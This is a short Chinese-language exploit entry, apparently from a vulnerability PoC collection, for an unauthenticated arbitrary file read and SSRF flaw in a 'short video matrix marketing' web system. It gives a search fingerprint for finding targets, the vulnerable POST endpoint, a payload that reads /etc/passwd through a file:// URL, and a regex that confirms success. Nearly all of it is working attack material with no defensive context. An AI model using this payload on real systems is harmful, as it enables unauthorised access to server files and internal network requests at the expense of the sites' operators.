# 短视频矩阵营销系统前台任意文件读取+SSRF

短视频矩阵营销系统前台 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"短视频矩阵营销系统"`
- **请求**：`POST /index.php/admin/Userinfo/poihuoqu HTTP/2`

**Payload**
```
poi=file:///etc/passwd
```
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$